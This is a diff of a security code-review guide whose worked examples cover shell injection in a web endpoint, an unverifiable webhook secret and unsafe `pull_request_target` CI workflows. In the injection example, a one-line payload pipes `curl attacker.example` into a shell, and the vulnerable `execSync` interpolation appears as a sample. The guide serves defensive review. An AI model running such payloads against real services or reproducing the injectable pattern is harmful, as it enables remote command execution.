@@ -6,20 +6,25 @@ shared severity rubric to the consequence established in the actual review.
 
 ## A real vulnerability: interpolated shell command
 
-Request: review a PR that adds a `git log` helper to a CLI.
+Request: review a PR that adds a web service endpoint returning commit history for a
+repository.
 
 ```ts
-const output = execSync(`git log --oneline ${ref}`).toString();
+app.get("/history", (req, res) => {
+  const output = execSync(`git log --oneline ${req.query.ref}`).toString();
+  res.send(output);
+});
 ```
 
-`ref` comes from a command-line argument. Trace the argument: it is passed through without
-validation, so `main; curl attacker.example | sh` executes arbitrary commands with the
-user's privileges.
+`ref` comes from an unauthenticated request's query string. Trace the value: it reaches the
+shell without validation, so a remote caller can send `?ref=main;curl attacker.example|sh`
+to execute arbitrary commands with the server's privileges, crossing from an untrusted
+network client into the service process.
 
-Report a BLOCKER with origin `introduced`: location, the argument path, the resulting
-command execution, and the direction of passing arguments as an array to a non-shell
-spawn or validating `ref` against an allowlist of ref syntax. Do not publish a working
-payload beyond the minimal demonstration.
+Report a BLOCKER with origin `introduced`: location, the request-to-shell path, the
+resulting command execution, and the direction of passing arguments as an array to a
+non-shell spawn or validating `ref` against an allowlist of Git ref syntax. Do not publish
+a working payload beyond the minimal demonstration.
 
 ## A false positive: parameterized query and test fixture
 
@@ -51,11 +56,14 @@ Request: review a webhook handler that compares an incoming signature with a sec
 resolved by `config.get("webhookSecret")`.
 
 The configuration loader lives in a package that cannot be inspected, so the review cannot
-establish whether the secret is required, rotated, or defaulted to an empty string, which
-would make the comparison pass for any payload.
+establish whether the secret is required or defaulted to an empty string, nor how the
+signature comparison and payload normalization are implemented. An unset or empty secret
+could let any payload pass, but only if the comparison logic also fails to reject it;
+neither can be confirmed from what is visible.
 
-Return `incomplete`: preserve any independent findings, state that the secret's source is
-essential, and name the module needed. Do not assume a vulnerability or a mitigation.
+Return `incomplete`: preserve any independent findings, state that the secret's source and
+the comparison implementation are essential, and name the modules needed. Do not assume a
+vulnerability or a mitigation.
 
 ## CI: unpinned action
 
@@ -79,14 +87,19 @@ declared on the releasing job only.
 
 ## CI: unsafe `pull_request_target`
 
-Request: review a workflow triggered by `pull_request_target` that checks out
-`${{ github.event.pull_request.head.sha }}` and runs `pnpm install` and the test script.
+Request: review a workflow triggered by `pull_request_target` that declares
+`permissions: write-all`, exposes a deployment token as a step environment variable, and
+checks out `${{ github.event.pull_request.head.sha }}` before running `pnpm install` and
+the test script.
 
-The privileged event runs with the base repository's secrets and write token, while the
-checkout and lifecycle scripts execute code controlled by the fork author. Report a
-BLOCKER: any contributor can exfiltrate secrets or push with the workflow's token.
-Recommend running untrusted code under `pull_request` with read-only permissions, and
-keeping `pull_request_target` for steps that never check out or execute the contribution.
+Trace the job's `permissions` block and secret exposure before concluding impact: this job
+holds the write token and the deployment secret, while the checkout and lifecycle scripts
+execute code controlled by the fork author. Report a BLOCKER: any contributor can
+exfiltrate the secret or push with the workflow's token. Recommend running untrusted code
+under `pull_request` with read-only permissions, and keeping `pull_request_target` for
+steps that never check out or execute the contribution. If the job instead held only
+read-only permissions and no secrets, downgrade or drop this finding: the trigger alone is
+not sufficient evidence of a privileged path.
 
 ## CI: untrusted input in a shell step and untrusted artifacts
 
